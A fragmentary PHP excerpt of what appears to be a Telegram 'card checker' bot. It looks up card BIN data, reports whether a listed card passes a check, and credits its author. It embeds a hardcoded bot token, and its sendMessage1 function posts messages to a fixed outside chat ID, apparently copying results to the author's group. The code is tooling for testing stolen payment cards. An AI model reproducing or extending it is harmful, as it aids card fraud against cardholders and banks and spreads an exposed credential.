...
$botToken = "5135934173:AAErWsF_Zqefjwwe1uncAekGSsQaEknEpnc";
...
$response = '✔️ Valid BIN <b>%0ABRAND: </b>'.$brand.'<b>%0ATYPE: </b>'.$type.'<b>%0ALEVEL: </b>'.$level.'<b>%0ABANK: </b>'.$bank.' <b>%0ACOUNTRY: </b>'.$country.' '.$flag.'%0A<b>CHECKED BY:</b> '.$username.'<b>%0ABOT BY:</b> @srfxdCyraX';
##++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
...
curl_exec($ch);
curl_close($ch);
$response = '<u>CARD:</u> <code>'.$lista.'</code><u>%0A%0ASTATUS:</u> <b>'.$skresult.'</b>%0A%0A<u>RESPONSE:</u> <b>'.$skresponse.'</b>%0A%0A----- BinData -----<b>%0ABANK: </b>'.$bank.'<b>%0ATYPE: </b>'.$type.'<b>%0ACOUNTRY: </b>'.$country.' '.$emoji.' %0A--------------------<u>%0A%0ACHECKED BY:</u> @'.$username.'<u>%0A%0ATIME TAKEN:</u> <b>'.$time.'s</b><u>%0A%0ABOT BY:</u> @srfxd';
        sendMessage($chatId,$response);
...
function sendMessage1 ($chatId,$message) {
        ...
        $url = $GLOBALS[website]."/sendMessage?chat_id=-1001688099698&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
        file_get_contents($url);
